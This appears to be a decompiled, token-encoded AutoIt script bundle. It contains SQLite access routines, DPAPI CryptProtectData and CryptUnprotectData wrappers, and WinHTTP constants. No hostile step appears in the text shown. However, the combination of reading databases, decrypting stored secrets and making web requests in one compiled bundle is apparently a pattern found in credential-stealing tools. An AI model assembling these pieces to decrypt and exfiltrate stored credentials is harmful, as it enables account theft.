32_SQLITE_GETTABLE2D($HDB,$SSQL,36$ARESULT,36$IROWS,36$ICOLUMNS,$ICHARSIZE=-1,$BSWICHDIMENSIONS=40)
4__SQLITE_HCHK($HDB,1)534287(@ERROR,0,$SQLITE_MISUSE)
4$ICHARSIZE=""2$ICHARSIZE<12$ICHARSIZE=415$ICHARSIZE=-1
28$SCALLBACK="",$BCALLBACK=40
4233($ARESULT)5
4322($ARESULT,16)="SQLITE_CALLBACK:"5
$SCALLBACK=336($ARESULT,16)
$BCALLBACK=39
8
8
$ARESULT=""
4$BSWICHDIMENSIONS=415$BSWICHDIMENSIONS=40
28$HQUERY
28$R=_SQLITE_QUERY($HDB,$SSQL,$HQUERY)
4@ERROR534287(2,@ERROR,$R)
4$R<>$SQLITE_OK5
__SQLITE_REPORTERROR($HDB,"_SQLite_GetTable2d",$SSQL)
_SQLITE_QUERYFINALIZE($HQUERY)
34287(-1,0,$R)
8
$IROWS=0
28$IRVAL_STEP,$IERROR
939
$IRVAL_STEP=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_step","ptr",$HQUERY)
4@ERROR5
$IERROR=@ERROR
_SQLITE_QUERYFINALIZE($HQUERY)
34287(3,$IERROR,$SQLITE_MISUSE)
8
23$IRVAL_STEP[0]
21$SQLITE_ROW
$IROWS+=1
21$SQLITE_DONE
18
216
_SQLITE_QUERYFINALIZE($HQUERY)
34287(3,$IERROR,$IRVAL_STEP[0])
24
10
28$IRET=_SQLITE_QUERYRESET($HQUERY)
4@ERROR5
$IERROR=@ERROR
_SQLITE_QUERYFINALIZE($HQUERY)
34287(4,$IERROR,$IRET)
8
28$ADATAROW
$R=_SQLITE_FETCHNAMES($HQUERY,$ADATAROW)
4@ERROR5
$IERROR=@ERROR
_SQLITE_QUERYFINALIZE($HQUERY)
34287(5,$IERROR,$R)
8
$ICOLUMNS=369($ADATAROW)
4$ICOLUMNS<=05
_SQLITE_QUERYFINALIZE($HQUERY)
34287(-1,0,$SQLITE_DONE)
8
43$BCALLBACK5
4$BSWICHDIMENSIONS5
26$ARESULT[$ICOLUMNS][$IROWS+1]
13$I=015$ICOLUMNS-1
4$ICHARSIZE>05
$ADATAROW[$I]=322($ADATAROW[$I],$ICHARSIZE)
8
$ARESULT[$I][0]=$ADATAROW[$I]
14
6
26$ARESULT[$IROWS+1][$ICOLUMNS]
13$I=015$ICOLUMNS-1
4$ICHARSIZE>05
$ADATAROW[$I]=322($ADATAROW[$I],$ICHARSIZE)
8
$ARESULT[0][$I]=$ADATAROW[$I]
14
8
6
28$ICBRVAL
$ICBRVAL=25($SCALLBACK,$ADATAROW)
4$ICBRVAL=$SQLITE_ABORT2$ICBRVAL=$SQLITE_INTERRUPT2@ERROR5
$IERROR=@ERROR
_SQLITE_QUERYFINALIZE($HQUERY)
34287(7,$IERROR,$ICBRVAL)
8
8
4$IROWS>05
13$I=115$IROWS
$R=_SQLITE_FETCHDATA($HQUERY,$ADATAROW,0,0,$ICOLUMNS)
4@ERROR5
$IERROR=@ERROR
_SQLITE_QUERYFINALIZE($HQUERY)
34287(6,$IERROR,$R)
8
4$BCALLBACK5
$ICBRVAL=25($SCALLBACK,$ADATAROW)
4$ICBRVAL=$SQLITE_ABORT2$ICBRVAL=$SQLITE_INTERRUPT2@ERROR5
$IERROR=@ERROR
_SQLITE_QUERYFINALIZE($HQUERY)
34287(7,$IERROR,$ICBRVAL)
8
6
13$J=015$ICOLUMNS-1
4$ICHARSIZE>05
$ADATAROW[$J]=322($ADATAROW[$J],$ICHARSIZE)
8
4$BSWICHDIMENSIONS5
$ARESULT[$J][$I]=$ADATAROW[$J]
6
$ARESULT[$I][$J]=$ADATAROW[$J]
8
14
8
14
8
34(_SQLITE_QUERYFINALIZE($HQUERY))
33
32_SQLITE_SETTIMEOUT($HDB=-1,$ITIMEOUT=1000)
4__SQLITE_HCHK($HDB,2)534287(@ERROR,0,$SQLITE_MISUSE)
4$ITIMEOUT=415$ITIMEOUT=1000
28$AVRVAL=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_busy_timeout","ptr",$HDB,"int",$ITIMEOUT)
4@ERROR534287(1,@ERROR,$SQLITE_MISUSE)
4$AVRVAL[0]<>$SQLITE_OK5287(-1)
34$AVRVAL[0]
33
32_SQLITE_QUERY($HDB,$SSQL,36$HQUERY)
4__SQLITE_HCHK($HDB,2)534287(@ERROR,0,$SQLITE_MISUSE)
28$IRVAL=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_prepare16_v2","ptr",$HDB,"wstr",$SSQL,"int",-1,"ptr*",0,"ptr*",0)
4@ERROR534287(1,@ERROR,$SQLITE_MISUSE)
4$IRVAL[0]<>$SQLITE_OK5
__SQLITE_REPORTERROR($HDB,"_SQLite_Query",$SSQL)
34287(-1,0,$IRVAL[0])
8
$HQUERY=$IRVAL[4]
__SQLITE_HADD($__G_AHQUERYS_SQLITE,$IRVAL[4])
34$IRVAL[0]
33
32_SQLITE_FETCHDATA($HQUERY,36$AROW,$BBINARY=40,$BDONOTFINALIZE=40,$ICOLUMNS=0)
26$AROW[1]
4__SQLITE_HCHK($HQUERY,7,40)534287(@ERROR,0,$SQLITE_MISUSE)
4$BBINARY=415$BBINARY=40
4$BDONOTFINALIZE=415$BDONOTFINALIZE=40
28$IRVAL_STEP=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_step","ptr",$HQUERY)
4@ERROR534287(1,@ERROR,$SQLITE_MISUSE)
4$IRVAL_STEP[0]<>$SQLITE_ROW5
4$BDONOTFINALIZE=401$IRVAL_STEP[0]=$SQLITE_DONE5
_SQLITE_QUERYFINALIZE($HQUERY)
8
34287(-1,0,$IRVAL_STEP[0])
8
43$ICOLUMNS5
28$IRVAL_COLCNT=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_data_count","ptr",$HQUERY)
4@ERROR534287(2,@ERROR,$SQLITE_MISUSE)
4$IRVAL_COLCNT[0]<=0534287(-1,0,$SQLITE_DONE)
$ICOLUMNS=$IRVAL_COLCNT[0]
8
27$AROW[$ICOLUMNS]
13$I=015$ICOLUMNS-1
28$IRVAL_COLTYPE=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_column_type","ptr",$HQUERY,"int",$I)
4@ERROR534287(4,@ERROR,$SQLITE_MISUSE)
4$IRVAL_COLTYPE[0]=$SQLITE_TYPE_NULL5
$AROW[$I]=""
19
8
4(3$BBINARY)1($IRVAL_COLTYPE[0]<>$SQLITE_TYPE_BLOB)5
28$SRVAL=58($__G_HDLL_SQLITE,"wstr:cdecl","sqlite3_column_text16","ptr",$HQUERY,"int",$I)
4@ERROR534287(3,@ERROR,$SQLITE_MISUSE)
$AROW[$I]=$SRVAL[0]
6
28$VRESULT=58($__G_HDLL_SQLITE,"ptr:cdecl","sqlite3_column_blob","ptr",$HQUERY,"int",$I)
4@ERROR534287(6,@ERROR,$SQLITE_MISUSE)
28$ICOLBYTES=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_column_bytes","ptr",$HQUERY,"int",$I)
4@ERROR534287(5,@ERROR,$SQLITE_MISUSE)
28$TRESULTSTRUCT=65("byte["&$ICOLBYTES[0]&"]",$VRESULT[0])
$AROW[$I]=13(66($TRESULTSTRUCT,1))
8
14
34$SQLITE_OK
33
32_SQLITE_CLOSE($HDB=-1)
4__SQLITE_HCHK($HDB,2)534287(@ERROR,0,$SQLITE_MISUSE)
28$IRVAL=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_close","ptr",$HDB)
4@ERROR534287(1,@ERROR,$SQLITE_MISUSE)
4$IRVAL[0]<>$SQLITE_OK5
__SQLITE_REPORTERROR($HDB,"_SQLite_Close")
34287(-1,0,$IRVAL[0])
8
$__G_HDB_SQLITE=0
__SQLITE_HDEL($__G_AHDBS_SQLITE,$HDB)
34$IRVAL[0]
33
32_SQLITE_SAFEMODE($BSAFEMODESTATE)
$__G_BSAFEMODESTATE_SQLITE=($BSAFEMODESTATE=39)
34$SQLITE_OK
33
32_SQLITE_QUERYFINALIZE($HQUERY)
4__SQLITE_HCHK($HQUERY,2,40)534287(@ERROR,0,$SQLITE_MISUSE)
28$AVRVAL=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_finalize","ptr",$HQUERY)
4@ERROR534287(1,@ERROR,$SQLITE_MISUSE)
__SQLITE_HDEL($__G_AHQUERYS_SQLITE,$HQUERY)
4$AVRVAL[0]<>$SQLITE_OK5287(-1)
34$AVRVAL[0]
33
32_SQLITE_QUERYRESET($HQUERY)
4__SQLITE_HCHK($HQUERY,2,40)534287(@ERROR,0,$SQLITE_MISUSE)
28$AVRVAL=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_reset","ptr",$HQUERY)
4@ERROR534287(1,@ERROR,$SQLITE_MISUSE)
4$AVRVAL[0]<>$SQLITE_OK5287(-1)
34$AVRVAL[0]
33
32_SQLITE_FETCHNAMES($HQUERY,36$ANAMES)
26$ANAMES[1]
4__SQLITE_HCHK($HQUERY,3,40)534287(@ERROR,0,$SQLITE_MISUSE)
28$AVDATACNT=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_column_count","ptr",$HQUERY)
4@ERROR534287(1,@ERROR,$SQLITE_MISUSE)
4$AVDATACNT[0]<=0534287(-1,0,$SQLITE_DONE)
27$ANAMES[$AVDATACNT[0]]
28$AVCOLNAME
13$ICNT=015$AVDATACNT[0]-1
$AVCOLNAME=58($__G_HDLL_SQLITE,"wstr:cdecl","sqlite3_column_name16","ptr",$HQUERY,"int",$ICNT)
4@ERROR534287(2,@ERROR,$SQLITE_MISUSE)
$ANAMES[$ICNT]=$AVCOLNAME[0]
14
34$SQLITE_OK
33
32_SQLITE_QUERYSINGLEROW($HDB,$SSQL,36$AROW)
$AROW=""
4__SQLITE_HCHK($HDB,2)534287(@ERROR,0,$SQLITE_MISUSE)
28$HQUERY
28$IRVAL=_SQLITE_QUERY($HDB,$SSQL,$HQUERY)
4@ERROR5
_SQLITE_QUERYFINALIZE($HQUERY)
34287(1,0,$IRVAL)
6
$IRVAL=_SQLITE_FETCHDATA($HQUERY,$AROW)
4$IRVAL=$SQLITE_OK5
_SQLITE_QUERYFINALIZE($HQUERY)
4@ERROR5
34287(4,0,$IRVAL)
6
34$SQLITE_OK
8
6
_SQLITE_QUERYFINALIZE($HQUERY)
34287(3,0,$IRVAL)
8
8
33
32_SQLITE_SQLITEEXE($SDATABASEFILE,$SINPUT,36$SOUTPUT,$SSQLITEEXEFILENAME="sqlite3.exe",$BDEBUG=40)
4$SSQLITEEXEFILENAME=-12$SSQLITEEXEFILENAME=415
$SSQLITEEXEFILENAME="sqlite3.exe"
$SSQLITEEXEFILENAME=__SQLITE_GETDOWNLOADEDPATH($SSQLITEEXEFILENAME)&$SSQLITEEXEFILENAME
4395($SSQLITEEXEFILENAME)534287(2,0,$SQLITE_MISUSE)
8
4395($SDATABASEFILE)5
28$HNEWFILE=110($SDATABASEFILE,$FO_OVERWRITE+$FO_CREATEPATH)
4$HNEWFILE=-15
34287(1,0,$SQLITE_CANTOPEN)
8
90($HNEWFILE)
8
28$SINPUTFILE=_TEMPFILE(),$SOUTPUTFILE=_TEMPFILE(),$IRVAL=$SQLITE_OK
28$HINPUTFILE=110($SINPUTFILE,$FO_OVERWRITE)
4$HINPUTFILE>-15
$SINPUT=".output stdout"&@CRLF&$SINPUT
123($HINPUTFILE,$SINPUT)
90($HINPUTFILE)
28$SCMD=@COMSPEC&" /c "&104($SSQLITEEXEFILENAME)&'  "'&104($SDATABASEFILE)&'" > "'&104($SOUTPUTFILE)&'" < "'&104($SINPUTFILE)&'"'
28$NERRORLEVEL=284($SCMD,@WORKINGDIR,@SW_HIDE)
4$BDEBUG=395
28$NERRORTEMP=@ERROR
4@ERROR5__SQLITE_PRINT("@@ Debug(_SQLite_SQLiteExe) : $sCmd = "&$SCMD&@CRLF&">ErrorLevel: "&$NERRORLEVEL&@CRLF)
287($NERRORTEMP)
8
4@ERROR=12$NERRORLEVEL=15
$IRVAL=$SQLITE_MISUSE
6
$SOUTPUT=112($SOUTPUTFILE,105($SOUTPUTFILE))
4311($SOUTPUT,"SQL error:",$STR_CASESENSE)>02311($SOUTPUT,"Incomplete SQL:",$STR_CASESENSE)>05$IRVAL=$SQLITE_ERROR
8
6
$IRVAL=$SQLITE_CANTOPEN
8
495($SINPUTFILE)594($SINPUTFILE)
23$IRVAL
21$SQLITE_MISUSE
287(2)
21$SQLITE_ERROR
287(3)
21$SQLITE_CANTOPEN
287(4)
24
34$IRVAL
33
32_SQLITE_ENCODE($VDATA)
4230($VDATA)5$VDATA=306($VDATA)
43233($VDATA)13220($VDATA)534287(1,0,"")
28$VRVAL="X'"
4324(322($VDATA,2))="0x"13220($VDATA)5
13$ICNT=115323($VDATA)
$VRVAL&=199(4(325($VDATA,$ICNT,1)),2)
14
6
43220($VDATA)5$VDATA=335($VDATA,4)
$VRVAL&=199($VDATA)
8
$VRVAL&="'"
34$VRVAL
33
32_SQLITE_ESCAPE($SSTRING,$IBUFFSIZE=41)
4$__G_HDLL_SQLITE=0534287(1,$SQLITE_MISUSE,"")
4230($SSTRING)5$SSTRING=306($SSTRING)
28$TSQL8=__SQLITE_STRINGTOUTF8STRUCT($SSTRING)
4@ERROR534287(2,@ERROR,0)
28$ARVAL=58($__G_HDLL_SQLITE,"ptr:cdecl","sqlite3_mprintf","str","'%q'","struct*",$TSQL8)
4@ERROR534287(1,@ERROR,"")
4$IBUFFSIZE=412$IBUFFSIZE<15$IBUFFSIZE=-1
28$SRESULT=__SQLITE_SZSTRINGREAD($ARVAL[0],$IBUFFSIZE)
4@ERROR534287(3,@ERROR,"")
58($__G_HDLL_SQLITE,"none:cdecl","sqlite3_free","ptr",$ARVAL[0])
34$SRESULT
33
32_SQLITE_FASTENCODE($VDATA)
43220($VDATA)5$VDATA=13($VDATA)
34"X'"&336($VDATA,2)&"'"
33
32_SQLITE_FASTESCAPE($SSTRING)
4230($SSTRING)5$SSTRING=306($SSTRING)
43233($SSTRING)534287(1,0,"")
34("'"&328($SSTRING,"'","''",0,$STR_CASESENSE)&"'")
33
32_SQLITE_GETTABLEDATA2D($HDB,$SSQL,36$ARESULT,36$IROWS,36$ANAMES)
4__SQLITE_HCHK($HDB,1)534287(@ERROR,0,$SQLITE_MISUSE)
$ARESULT=""
28$HQUERY
28$R=_SQLITE_QUERY($HDB,$SSQL,$HQUERY)
4@ERROR534287(2,@ERROR,$R)
4$R<>$SQLITE_OK5
__SQLITE_REPORTERROR($HDB,"_SQLite_GetTableData",$SSQL)
34287(-1,0,$R)
8
28$ADATAROW
$R=_SQLITE_FETCHNAMES($HQUERY,$ANAMES)
4@ERROR5
28$IERROR=@ERROR
_SQLITE_QUERYFINALIZE($HQUERY)
34287(5,$IERROR,$R)
8
28$ICOLUMNS=369($ANAMES)
2830$ICHUNK=8192
28$NMAXROW=$ICHUNK
26$ARESULT[$NMAXROW][$ICOLUMNS]
$IROWS=0
9_SQLITE_FETCHDATA($HQUERY,$ADATAROW)=$SQLITE_OK
4$IROWS=$NMAXROW5
$NMAXROW+=$ICHUNK
27$ARESULT[$NMAXROW][$ICOLUMNS]
8
13$J=015$ICOLUMNS-1
$ARESULT[$IROWS][$J]=$ADATAROW[$J]
14
$IROWS+=1
10
4$IROWS=05
$ARESULT=""
6
27$ARESULT[$IROWS][$ICOLUMNS]
8
34$SQLITE_OK
33
32__SQLITE_HCHK(36$HGENERIC,$NERROR,$BDB=39)
4$__G_HDLL_SQLITE=0534287(1,$SQLITE_MISUSE,$SQLITE_MISUSE)
4$HGENERIC=-12$HGENERIC=""2$HGENERIC=415
43$BDB534287($NERROR,0,$SQLITE_ERROR)
$HGENERIC=$__G_HDB_SQLITE
8
43$__G_BSAFEMODESTATE_SQLITE534$SQLITE_OK
4$BDB5
4_ARRAYSEARCH($__G_AHDBS_SQLITE,$HGENERIC)>0534$SQLITE_OK
6
4_ARRAYSEARCH($__G_AHQUERYS_SQLITE,$HGENERIC)>0534$SQLITE_OK
8
34287($NERROR,0,$SQLITE_ERROR)
33
32__SQLITE_HADD(36$AHLISTS,$HGENERIC)
_ARRAYADD($AHLISTS,$HGENERIC)
33
32__SQLITE_HDEL(36$AHLISTS,$HGENERIC)
28$IELEMENT=_ARRAYSEARCH($AHLISTS,$HGENERIC)
4$IELEMENT>05_ARRAYDELETE($AHLISTS,$IELEMENT)
33
32__SQLITE_VERSCMP($SFILE,$SVERSION)
28$AVRVAL=58($SFILE,"str:cdecl","sqlite3_libversion")
4@ERROR534$SQLITE_CORRUPT
28$SFILEVERSION=331($AVRVAL[0],".")
28$IMAINTVERSION=0
4$SFILEVERSION[0]=45$IMAINTVERSION=$SFILEVERSION[4]
$SFILEVERSION=(($SFILEVERSION[1]*1000+$SFILEVERSION[2])*1000+$SFILEVERSION[3])*100+$IMAINTVERSION
4$SVERSION<100000005$SVERSION=$SVERSION*100
4$SFILEVERSION>=$SVERSION534$SQLITE_OK
34$SQLITE_MISMATCH
33
32__SQLITE_HDBG()
__SQLITE_PRINT("State : "&$__G_BSAFEMODESTATE_SQLITE&@CRLF)
28$ATMP=$__G_AHDBS_SQLITE
13$I=015369($ATMP)-1
__SQLITE_PRINT("$__g_ahDBs_SQLite     -> ["&$I&"]"&$ATMP[$I]&@CRLF)
14
$ATMP=$__G_AHQUERYS_SQLITE
13$I=015369($ATMP)-1
__SQLITE_PRINT("$__g_ahQuerys_SQLite  -> ["&$I&"]"&$ATMP[$I]&@CRLF)
14
33
32__SQLITE_REPORTERROR($HDB,$SFUNCTION,$SQUERY=41,$SERROR=41,$VRETURNVALUE=41,$ICURERR=@ERROR,$ICUREXT=@EXTENDED)
4@COMPILED534287($ICURERR,$ICUREXT)
4$SERROR=415$SERROR=_SQLITE_ERRMSG($HDB)
4$SQUERY=415$SQUERY=""
28$SOUT="!   SQLite.au3 Error"&@CRLF
$SOUT&="--> Function: "&$SFUNCTION&@CRLF
4$SQUERY<>""5$SOUT&="--> Query:    "&$SQUERY&@CRLF
$SOUT&="--> Error:    "&$SERROR&@CRLF
__SQLITE_PRINT($SOUT&@CRLF)
43($VRETURNVALUE=41)534287($ICURERR,$ICUREXT,$VRETURNVALUE)
34287($ICURERR,$ICUREXT)
33
32__SQLITE_SZSTRINGREAD($PPTR,$IMAXLEN=-1)
4$PPTR=0534""
4$__G_HMSVCRTDLL_SQLITE<15$__G_HMSVCRTDLL_SQLITE=64("msvcrt.dll")
28$ASTRLEN=58($__G_HMSVCRTDLL_SQLITE,"ulong_ptr:cdecl","strlen","ptr",$PPTR)
4@ERROR534287(1,@ERROR,"")
28$ILEN=$ASTRLEN[0]+1
28$TSTRING=65("byte["&$ILEN&"]",$PPTR)
4@ERROR534287(2,@ERROR,"")
28$IERROR=0
28$SRTN=__SQLITE_UTF8STRUCTTOSTRING($TSTRING)
4@ERROR5
$IERROR=3
8
4$IMAXLEN<=05
34287($IERROR,@EXTENDED,$SRTN)
6
34287($IERROR,@EXTENDED,322($SRTN,$IMAXLEN))
8
33
32__SQLITE_SZFREE($PPTR,$ICURERR=@ERROR)
4$PPTR<>0558($__G_HDLL_SQLITE,"none:cdecl","sqlite3_free","ptr",$PPTR)
287($ICURERR)
33
32__SQLITE_STRINGTOUTF8STRUCT($SSTRING)
28$ARESULT=58("kernel32.dll","int","WideCharToMultiByte","uint",65001,"dword",0,"wstr",$SSTRING,"int",-1,"ptr",0,"int",0,"ptr",0,"ptr",0)
4@ERROR534287(1,@ERROR,"")
28$TTEXT=65("char["&$ARESULT[0]&"]")
$ARESULT=58("kernel32.dll","int","WideCharToMultiByte","uint",65001,"dword",0,"wstr",$SSTRING,"int",-1,"struct*",$TTEXT,"int",$ARESULT[0],"ptr",0,"ptr",0)
4@ERROR534287(2,@ERROR,"")
34$TTEXT
33
32__SQLITE_UTF8STRUCTTOSTRING($TTEXT)
28$ARESULT=58("kernel32.dll","int","MultiByteToWideChar","uint",65001,"dword",0,"struct*",$TTEXT,"int",-1,"ptr",0,"int",0)
4@ERROR534287(1,@ERROR,"")
28$TWSTR=65("wchar["&$ARESULT[0]&"]")
$ARESULT=58("kernel32.dll","int","MultiByteToWideChar","uint",65001,"dword",0,"struct*",$TTEXT,"int",-1,"struct*",$TWSTR,"int",$ARESULT[0])
4@ERROR534287(2,@ERROR,"")
3466($TWSTR,1)
33
32__SQLITE_CONSOLEWRITE($STEXT)
33($STEXT)
33
32__SQLITE_PRINT($STEXT)
4225($__G_HPRINTCALLBACK_SQLITE)5
4$__G_BUTF8ERRORMSG_SQLITE5
28$TSTR8=__SQLITE_STRINGTOUTF8STRUCT($STEXT)
$__G_HPRINTCALLBACK_SQLITE(66($TSTR8,1))
6
$__G_HPRINTCALLBACK_SQLITE($STEXT)
8
8
33
32__SQLITE_GETDOWNLOADEDPATH(36$SDLL_FILENAME,$VINLINEVERSION="")
28$BDOWNLOADDLL=39,$IEXTENDED=0
4$VINLINEVERSION=""5
$VINLINEVERSION=25("__SQLite_Inline_Version")
4@ERROR5$BDOWNLOADDLL=40
6
28$AVERSION=331($VINLINEVERSION,".")
4@ERROR=05
28$IMAINTVERSION=0
4$AVERSION[0]=45$IMAINTVERSION=$AVERSION[4]
$VINLINEVERSION=(($AVERSION[1]*1000+$AVERSION[2])*1000+$AVERSION[3])*100+$IMAINTVERSION
8
8
28$SDLL_DIRPATH="",$SLOCALPATH=@LOCALAPPDATADIR&"\AutoIt v3\SQLite\"
4__SQLITE_VERSCMP(@SCRIPTDIR&"\"&$SDLL_FILENAME,$VINLINEVERSION)=$SQLITE_OK5
$SDLL_DIRPATH=@SCRIPTDIR&"\"
$BDOWNLOADDLL=40
7__SQLITE_VERSCMP(@WORKINGDIR&"\"&$SDLL_FILENAME,$VINLINEVERSION)=$SQLITE_OK5
$SDLL_DIRPATH=@WORKINGDIR&"\"
$BDOWNLOADDLL=40
7__SQLITE_VERSCMP($SLOCALPATH&$SDLL_FILENAME,$VINLINEVERSION)=$SQLITE_OK5
$SDLL_DIRPATH=$SLOCALPATH
$BDOWNLOADDLL=40
7__SQLITE_VERSCMP(@SYSTEMDIR&"\"&$SDLL_FILENAME,$VINLINEVERSION)=$SQLITE_OK5
$SDLL_DIRPATH=@SYSTEMDIR&"\"
$BDOWNLOADDLL=40
7__SQLITE_VERSCMP(@WINDOWSDIR&"\"&$SDLL_FILENAME,$VINLINEVERSION)=$SQLITE_OK5
$SDLL_DIRPATH=@WINDOWSDIR&"\"
$BDOWNLOADDLL=40
7$BDOWNLOADDLL5
28$SEXT=330($SDLL_FILENAME,4)
28$SDLL_FILENAME_VER=328($SDLL_FILENAME,$SEXT,"")&"_"&$VINLINEVERSION&$SEXT
4__SQLITE_VERSCMP(@SCRIPTDIR&"\"&$SDLL_FILENAME_VER,$VINLINEVERSION)=$SQLITE_OK5
$SDLL_DIRPATH=@SCRIPTDIR&"\"
$BDOWNLOADDLL=40
7__SQLITE_VERSCMP(@WORKINGDIR&"\"&$SDLL_FILENAME_VER,$VINLINEVERSION)=$SQLITE_OK5
$SDLL_DIRPATH=@WORKINGDIR&"\"
$BDOWNLOADDLL=40
7__SQLITE_VERSCMP($SLOCALPATH&$SDLL_FILENAME_VER,$VINLINEVERSION)=$SQLITE_OK5
$SDLL_DIRPATH=$SLOCALPATH
$BDOWNLOADDLL=40
7__SQLITE_VERSCMP(@SYSTEMDIR&"\"&$SDLL_FILENAME_VER,$VINLINEVERSION)=$SQLITE_OK5
$SDLL_DIRPATH=@SYSTEMDIR&"\"
$BDOWNLOADDLL=40
7__SQLITE_VERSCMP(@WINDOWSDIR&"\"&$SDLL_FILENAME_VER,$VINLINEVERSION)=$SQLITE_OK5
$SDLL_DIRPATH=@WINDOWSDIR&"\"
$BDOWNLOADDLL=40
8
43$BDOWNLOADDLL5
$IEXTENDED=1
6
$SDLL_DIRPATH=$SLOCALPATH
8
$SDLL_FILENAME=$SDLL_FILENAME_VER
8
34288($IEXTENDED,$SDLL_DIRPATH)
33
2930$CRYPTPROTECT_LOCAL_MACHINE=4
2930$CRYPTPROTECT_UI_FORBIDDEN=1
2930$CRYPTPROTECT_LOCAL_AUDIT=16
2930$CRYPTPROTECT_VERIFY_PROTECTION=64
2930$CRYPTPROTECT_PROMPT_ON_PROTECT=2
2930$CRYPTPROTECT_PROMPT_ON_UNPROTECT=1
2930$CRYPT_I_NEW_PROTECTION_REQUIRED=-2146889710
29$HDLL_CRYPT32=64("crypt32.dll")
256("__CryptProtect_DllClose")
2930$TAGDATA_BLOB="DWORD cbData;ptr pbData;"
2930$TAGCRYPTPROTECT_PROMPTSTRUCT="DWORD cbSize;DWORD dwPromptFlags;HWND hwndApp;ptr szPrompt;"
32_CRYPTPROTECTDATA($SSTRING,$SDESC="",$SPWD="",$IFLAG=0,$PPROMPT=0)
28$ARET,$IERROR,$TENTROPY,$TDESC,$PENTROPY=0,$PDESC=0
28$TDATAIN=__DATATOBLOB($SSTRING)
4$SPWD<>""5
$TENTROPY=__DATATOBLOB($SPWD)
$PENTROPY=67($TENTROPY)
8
4$SDESC<>""5
$TDESC=65("wchar desc["&323($SDESC)+1&"]")
69($TDESC,"desc",$SDESC)
$PDESC=67($TDESC)
8
28$TDATABUF=65($TAGDATA_BLOB)
$ARET=58($HDLL_CRYPT32,"BOOL","CryptProtectData","struct*",$TDATAIN,"ptr",$PDESC,"ptr",$PENTROPY,"ptr",0,"ptr",$PPROMPT,"DWORD",$IFLAG,"struct*",$TDATABUF)
$IERROR=@ERROR
_WINAPI_LOCALFREE(66($TDATAIN,"pbData"))
4$SPWD<>""5_WINAPI_LOCALFREE(66($TENTROPY,"pbData"))
4$IERROR534287(1,0,"")
28$TDATAOUT=65("byte data["&66($TDATABUF,"cbData")&"]",66($TDATABUF,"pbData"))
28$BDATA=66($TDATAOUT,"data")
_WINAPI_LOCALFREE(66($TDATABUF,"pbData"))
34$BDATA
33
32_CRYPTUNPROTECTDATA($BDATA,36$SDESC,$SPWD="",$IFLAG=0,$PPROMPT=0)
28$ARET,$IERROR,$TENTROPY,$PENTROPY=0
28$TDATAIN=__DATATOBLOB($BDATA)
$SDESC=""
4$SPWD<>""5
$TENTROPY=__DATATOBLOB($SPWD)
$PENTROPY=67($TENTROPY)
8
28$TDATABUF=65($TAGDATA_BLOB)
28$TDESC=65("ptr desc")
28$PDESC=67($TDESC)
$ARET=58($HDLL_CRYPT32,"BOOL","CryptUnprotectData","struct*",$TDATAIN,"ptr*",$PDESC,"ptr",$PENTROPY,"ptr",0,"ptr",$PPROMPT,"DWORD",$IFLAG,"struct*",$TDATABUF)
$IERROR=@ERROR
_WINAPI_LOCALFREE(66($TDATAIN,"pbData"))
4$SPWD<>""5_WINAPI_LOCALFREE(66($TENTROPY,"pbData"))
4$IERROR534287(1,0,"")
28$TDATAOUT=65("char data["&66($TDATABUF,"cbData")&"]",66($TDATABUF,"pbData"))
28$SDATA=66($TDATAOUT,"data")
4$ARET[2]=0534287(2,0,"")
28$ALEN=58("msvcrt.dll","UINT:cdecl","wcslen","ptr",$ARET[2])
28$TDESCNEW=65("wchar desc["&$ALEN[0]+1&"]",$ARET[2])
$SDESC=66($TDESCNEW,"desc")
_WINAPI_LOCALFREE($ARET[2])
_WINAPI_LOCALFREE(66($TDATABUF,"pbData"))
34$SDATA
33
32__DATATOBLOB($DATA)
28$ILEN,$TDATAIN,$TDATA,$AMEM
2830$LMEM_ZEROINIT=64
20
21233($DATA)
$ILEN=323($DATA)
21220($DATA)
$ILEN=14($DATA)
216
34287(1,0,0)
22
$TDATAIN=65($TAGDATA_BLOB)
$AMEM=58("Kernel32.dll","handle","LocalAlloc","UINT",$LMEM_ZEROINIT,"UINT",$ILEN)
$TDATA=65("byte["&$ILEN&"]",$AMEM[0])
$1=69($TDATA,1,$DATA)
$2=69($TDATAIN,"cbData",$ILEN)
$3=69($TDATAIN,"pbData",67($TDATA))
34$TDATAIN
33
32__CRYPTPROTECT_DLLCLOSE()
63($HDLL_CRYPT32)
33
29$SPROXY,$SUSER,$SPASS
2930$INTERNET_DEFAULT_PORT=0
2930$INTERNET_DEFAULT_HTTP_PORT=80
2930$INTERNET_DEFAULT_HTTPS_PORT=443
2930$INTERNET_SCHEME_HTTP=1
2930$INTERNET_SCHEME_HTTPS=2
2930$INTERNET_SCHEME_FTP=3
2930$ICU_ESCAPE=-2147483648
2930$WINHTTP_FLAG_ASYNC=268435456
2930$WINHTTP_FLAG_ESCAPE_PERCENT=4
2930$WINHTTP_FLAG_NULL_CODEPAGE=8
2930$WINHTTP_FLAG_ESCAPE_DISABLE=64
2930$WINHTTP_FLAG_ESCAPE_DISABLE_QUERY=128
2930$WINHTTP_FLAG_BYPASS_PROXY_CACHE=256
2930$WINHTTP_FLAG_REFRESH=$WINHTTP_FLAG_BYPASS_PROXY_CACHE
2930$WINHTTP_FLAG_SECURE=8388608
2930$WINHTTP_ACCESS_TYPE_DEFAULT_PROXY=0
2930$WINHTTP_ACCESS_TYPE_NO_PROXY=1
2930$WINHTTP_ACCESS_TYPE_NAMED_PROXY=3
2930$WINHTTP_NO_PROXY_NAME=""
2930$WINHTTP_NO_PROXY_BYPASS=""
2930$WINHTTP_NO_REFERER=""
2930$WINHTTP_DEFAULT_ACCEPT_TYPES=0
2930$WINHTTP_NO_ADDITIONAL_HEADERS=""
2930$WINHTTP_NO_REQUEST_DATA=""
2930$WINHTTP_HEADER_NAME_BY_INDEX=""
2930$WINHTTP_NO_OUTPUT_BUFFER=0
2930$WINHTTP_NO_HEADER_INDEX=0
2930$WINHTTP_ADDREQ_INDEX_MASK=65535
2930$WINHTTP_ADDREQ_FLAGS_MASK=-65536
2930$WINHTTP_ADDREQ_FLAG_ADD_IF_NEW=268435456
